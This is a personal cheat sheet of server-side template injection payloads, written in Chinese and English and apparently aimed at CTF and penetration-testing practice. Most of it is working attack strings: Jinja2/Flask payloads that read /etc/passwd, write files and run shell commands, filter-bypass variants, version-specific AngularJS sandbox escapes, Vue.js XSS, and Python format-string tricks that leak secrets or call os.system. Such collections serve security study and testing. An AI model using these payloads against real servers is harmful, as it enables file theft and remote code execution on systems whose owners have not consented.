# SSTI (Server Side Template Injection)
[TOC]
###### tags: `Security` `Web`

## 判斷使用的 Template

# Templates
## Jinja2 (Python)

# Other
![img](https://i.imgur.com/GVZeVq6.png)

## Testing
- ` {{ 7*'7' }}`
    - Twig: `49`
    - Jinja2: `7777777`
- `<%= 7*7 %>`
    - Ruby ERB: `49`

## Flask/Jinja2
- Dump all used classes
    - `{{ ''.__class__.__mro__[2].__subclasses__() }}
`
- Read File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
- Write File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
- RCE
    - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
        - evil config
    - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
        - load config
    - `{{ config['RUNCMD']('cat flag',shell=True) }}`

- RCE (another way)
    - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
- Python3 RCE
    - ```python
      {% for c in [].__class__.__base__.__subclasses__() %}
        {% if c.__name__ == 'catch_warnings' %}
          {% for b in c.__init__.__globals__.values() %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys() %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
          {% endfor %}
        {% endif %}
      {% endfor %}
      ```
- 過濾中括號
    - `__getitem__`
    - `{{''.__class__.__mro__.__getitem__(2)}}`
        - `{{''.__class__.__mro__[2]}}`
- 過濾`{{` or `}}`
    - 用`{%%}`
    - 執行結果往外傳
- 過濾`.`
    - `{{''.__class__}}`
        - `{{''['__class__']}}`
        - `{{''|attr('__class__')}}`
- 過濾Keyword
    - 用`\xff`形式去繞
    - `{{''["\x5f\x5fclass\x5f\x5f"]}}`
- 用request繞
    - `{{''.__class__}}`
        - `{{''[request.args.kaibro]}}&kaibro=__class__`

## AngularJS
- v1.6後移除Sandbox
- Payload
    - `{{ 7*7 }}` => 49
    - `{{ this }}`
    - `{{ this.toString() }}`
    - `{{ constructor.toString() }}`
    - `{{ constructor.constructor('alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }}` 2.3 v1.2.19-v1.2.23
    - `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}` v1.2.24-v1.2.29
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` v1.3.20
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` v1.4.0-v1.4.9
    - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
    - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6

## Vue.js
- `{{constructor.constructor('alert(1)')()}}`
- https://github.com/dotboris/vuejs-serverside-template-xss

## Python
- `%`
    - 輸入`%(passowrd)s`即可偷到密碼：
    ```python
    userdata = {"user" : "kaibro", "password" : "ggininder" }
    passwd  = raw_input("Password: ")
    if passwd != userdata["password"]:
        print ("Password " + passwd + " is wrong for user %(user)s") % userdata
    ```
- `f`
    - python 3.6
    - example
        - `a="gg"`
        - `b=f"{a} ininder"`
            - `>>> gg ininder`
    - example2
        - `f"{os.system('ls')}"`

## Tool
- https://github.com/epinna/tplmap

---

http://blog.portswigger.net/2015/08/server-side-template-injection.html